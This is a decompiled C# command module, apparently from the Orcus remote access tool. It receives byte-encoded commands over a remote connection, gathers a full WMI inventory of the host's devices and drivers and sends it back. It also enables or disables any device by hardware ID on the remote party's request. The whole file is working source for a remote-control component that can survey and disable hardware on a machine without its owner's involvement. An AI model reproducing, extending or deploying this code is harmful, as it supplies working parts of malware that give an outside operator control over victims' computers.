using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.DeviceManager;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Commands.DeviceManager;

public class DeviceManagerCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		DeviceManagerCommunication val = (DeviceManagerCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 2)
			{
				return;
			}
			string @string = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
			foreach (HardwareHelper.TemporaryDeviceInfo item in HardwareHelper.EnumerateDevices())
			{
				if (item.GetProperty(SPDRP.SPDRP_HARDWAREID) == @string)
				{
					try
					{
						HardwareHelper.EnableDevice(item.HDevInfo, item.DeviceData, parameter[1] == 1);
						byte[] array = new byte[parameter.Length - 1];
						Array.Copy(parameter, 1, array, 0, array.Length);
						((Command)this).ResponseBytes((byte)4, array, connectionInfo);
						return;
					}
					catch (Exception ex)
					{
						((Command)this).ResponseBytes((byte)3, Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
						return;
					}
				}
			}
			((Command)this).ResponseByte((byte)5, connectionInfo);
		}
		else
		{
			((Command)this).ResponseBytes((byte)1, new Serializer(typeof(List<DeviceInfo>)).Serialize((object)GetAllDevices()), connectionInfo);
		}
	}

	private List<DeviceInfo> GetAllDevices()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d3: Expected O, but got Unknown
		List<DeviceInfo> list = new List<DeviceInfo>();
		ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\CIMV2", "Select * from Win32_PnPEntity");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				foreach (ManagementObject item in ((IEnumerable)val2).Cast<ManagementObject>())
				{
					if (item.TryGetProperty<string>("DeviceId") == "HTREE\\ROOT\\0")
					{
						continue;
					}
					DeviceInfo val3 = new DeviceInfo();
					val3.set_Name(item.TryGetProperty<string>("Caption"));
					val3.set_DeviceId(item.TryGetProperty<string>("DeviceId"));
					val3.set_Description(item.TryGetProperty<string>("Description"));
					val3.set_Manufacturer(item.TryGetProperty<string>("Manufacturer"));
					val3.set_StatusCode(item.TryGetProperty<uint>("ConfigManagerErrorCode"));
					DeviceInfo val4 = val3;
					string[] array = item.TryGetProperty<string[]>("HardWareID");
					if (array != null && array.Length != 0)
					{
						val4.set_HardwareId(array[0]);
					}
					list.Add(val4);
					string g = item.TryGetProperty<string>("ClassGuid");
					Guid guid;
					try
					{
						guid = new Guid(g);
					}
					catch (Exception)
					{
						guid = Guid.Empty;
					}
					val4.set_Category((DeviceCategory)0);
					DeviceCategory[] array2 = (DeviceCategory[])Enum.GetValues(typeof(DeviceCategory));
					foreach (DeviceCategory val5 in array2)
					{
						if (EnumHelper.GetAttributeOfType<DeviceCategoryGuidAttribute>((Enum)(object)val5).get_Guid() == guid)
						{
							val4.set_Category(val5);
							break;
						}
					}
					if ((int)val4.get_Category() == 0)
					{
						val4.set_CustomCategory(item.TryGetProperty<string>("PNPClass"));
					}
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		ManagementObjectSearcher val6 = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\CIMV2", "Select * from Win32_PnPSignedDriver");
		try
		{
			ManagementObjectCollection val7 = val6.Get();
			try
			{
				foreach (ManagementObject item2 in ((IEnumerable)val7).Cast<ManagementObject>())
				{
					string deviceId = item2.TryGetProperty<string>("DeviceID");
					DeviceInfo val8 = ((IEnumerable<DeviceInfo>)list).FirstOrDefault((Func<DeviceInfo, bool>)((DeviceInfo x) => x.get_DeviceId() == deviceId));
					if (val8 != null)
					{
						val8.set_DriverFriendlyName(item2.TryGetProperty<string>("FriendlyName"));
						string text = item2.TryGetProperty<string>("DriverDate");
						if (text != null)
						{
							val8.set_DriverBuildDate((ManagementExtensions.ToDateTimeSafe(text) ?? DateTime.MinValue).ToUniversalTime());
						}
						val8.set_DriverDescription(item2.TryGetProperty<string>("Description"));
						string text2 = item2.TryGetProperty<string>("InstallDate");
						if (text2 != null)
						{
							val8.set_DriverInstallDate((ManagementExtensions.ToDateTimeSafe(text2) ?? DateTime.MinValue).ToUniversalTime());
						}
						val8.set_DriverName(item2.TryGetProperty<string>("DriverName"));
						val8.set_DriverProviderName(item2.TryGetProperty<string>("DriverProviderName"));
						val8.set_DriverSigner(item2.TryGetProperty<string>("Signer"));
						val8.set_DriverVersion(item2.TryGetProperty<string>("DriverVersion"));
						val8.set_DriverInfName(item2.TryGetProperty<string>("InfName"));
					}
				}
				return list;
			}
			finally
			{
				((IDisposable)val7)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val6)?.Dispose();
		}
	}

	protected override uint GetId()
	{
		return 30u;
	}
}
